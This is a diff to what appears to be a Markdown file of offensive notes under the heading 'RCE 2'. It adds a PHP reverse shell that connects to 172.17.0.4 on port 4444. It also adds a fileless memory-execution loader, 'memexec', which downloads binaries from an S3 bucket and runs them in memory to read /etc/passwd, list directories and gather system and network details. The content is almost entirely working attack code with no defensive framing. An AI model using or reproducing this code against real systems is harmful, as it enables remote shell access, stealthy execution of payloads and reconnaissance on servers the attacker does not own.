@@ -379,8 +379,26 @@ _start:
 
 
 ## RCE 2
+
+docker run -it --rm cgr.dev/chainguard/php -a
+docker run -it --rm ubuntu bash
+
 ```php
-$binurl = "http://192.168.1.15/data";
+$sock=fsockopen("172.17.0.4",4444);
+
+$cmd_array = ['php', '-a'];
+$descriptorspec = array(
+    0 => $sock,
+    1 => $sock,
+    2 => $sock
+);
+
+$process = proc_open($cmd_array, $descriptorspec, $pipes);
+```
+
+```php
+$binurl = "https://privesc.s3.eu-west-1.amazonaws.com/memexec/loaderarm";
+
 $executor='
 preg_match("/^.*vdso.*\$/m", file_get_contents("/proc/self/maps"), $matches);
 $vdso_addr = substr($matches[0], 0, strpos($matches[0], "-"));
@@ -425,7 +443,7 @@ while (!feof($f))
 fclose($f);
 
 $GLOBALS['pipe'] = $pipes[0];
-function ddexec($url, $argv = [])
+function memexec($url, $argv = [])
 {
     $args = "";
     foreach($argv as &$arg)
@@ -442,4 +460,13 @@ function ddexec($url, $argv = [])
     fwrite($GLOBALS['pipe'], $args);
     fwrite($GLOBALS['pipe'], $binary);
 }
+
+memexec("https://privesc.s3.eu-west-1.amazonaws.com/memexec/cat", ["brrr", "/etc/passwd"]);
+
+memexec("https://privesc.s3.eu-west-1.amazonaws.com/memexec/ls", ["brrr", "-la", "/"]);
+
+memexec("https://privesc.s3.eu-west-1.amazonaws.com/memexec/busyboxarm", ["ls", "-la", "/"]);
+memexec("https://privesc.s3.eu-west-1.amazonaws.com/memexec/busyboxarm", ["uname", "-a"]);
+memexec("https://privesc.s3.eu-west-1.amazonaws.com/memexec/busyboxarm", ["ifconfig"]);
+
 ```
